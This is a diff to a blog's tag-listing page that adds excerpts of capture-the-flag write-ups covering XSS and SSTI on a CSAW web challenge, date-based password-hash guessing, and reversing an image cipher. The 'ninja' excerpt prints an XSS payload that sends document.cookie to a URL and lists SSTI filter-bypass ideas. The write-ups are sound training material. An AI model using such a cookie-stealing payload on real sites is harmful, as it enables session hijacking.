@@ -137,7 +137,7 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2>Remote Control - NCL Team
+    <h2>Remote Control
     </h2>
   </header>
   <section class="entry-content">
@@ -147,7 +147,50 @@ Givens We recently obtained a dump of the IR protocol used to control an LG tele
  What is the protocol that is being used? What is the device ID of the device being captured?...</p>
   </section>
   <footer class="entry-footer"><span title='2021-11-07 17:05:44 -0400 -0400'>November 7, 2021</span></footer>
-  <a class="entry-link" aria-label="post link to Remote Control - NCL Team" href="https://incub4t0r.github.io/posts/remotecontrol/"></a>
+  <a class="entry-link" aria-label="post link to Remote Control" href="https://incub4t0r.github.io/posts/remotecontrol/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2>ninja
+    </h2>
+  </header>
+  <section class="entry-content">
+    <p>TL;DR Found out site had xss, also had ssti, blocks :- _ ,config ,os, RUNCMD, base, use request arguments to create variables and pass them in outside the raw string.
+Givens Hey guys come checkout this website i made to test my ninja-coding skills.
+http://web.chal.csaw.io:5000/
+Work Initial Enumeration  Found that the site has xss Attempted to dump cookie  &lt;img src=x onerror=this.src=‘http://web.chal.csaw.io:5000/submit?=&#39;&#43;document.cookie&gt;   We know that we can put html inside running flask, python 2....</p>
+  </section>
+  <footer class="entry-footer"><span title='2021-09-12 17:05:44 -0400 EDT'>September 12, 2021</span></footer>
+  <a class="entry-link" aria-label="post link to ninja" href="https://incub4t0r.github.io/posts/ninja/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2>Weak Password
+    </h2>
+  </header>
+  <section class="entry-content">
+    <p>I realize in hindsight that I should’ve used a hash cracker like hashcat or john, but my knowledge at the time was limited so I ended up using python to generate a couple hundred hashes. I’ll do better next time.
+TL;DR Scripted trying out every date from 1900-2021 appended to the front and back of aaron in the format of YYYYMMDD.
+Givens Can you crack Aaron’s password hash? He seems to like simple passwords....</p>
+  </section>
+  <footer class="entry-footer"><span title='2021-09-12 17:05:44 -0400 EDT'>September 12, 2021</span></footer>
+  <a class="entry-link" aria-label="post link to Weak Password" href="https://incub4t0r.github.io/posts/weakpassword/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2>Image Encryption
+    </h2>
+  </header>
+  <section class="entry-content">
+    <p>This was a fun one, it required me to annotate the source code and figure out a decryption method for the given picture.
+TL;DR The file image-encryption.py is opening a target image file, in this case, img.png.
+The program then creates an array of the pixels that the image contains, then parses through each pixel. Upon arriving at each pixel, the program then stores into a variable what is assumably the RGB values of each pixel....</p>
+  </section>
+  <footer class="entry-footer"><span title='2020-05-01 17:05:44 -0400 EDT'>May 1, 2020</span></footer>
+  <a class="entry-link" aria-label="post link to Image Encryption" href="https://incub4t0r.github.io/posts/angstromimageencryption/"></a>
 </article>
     </main>
     
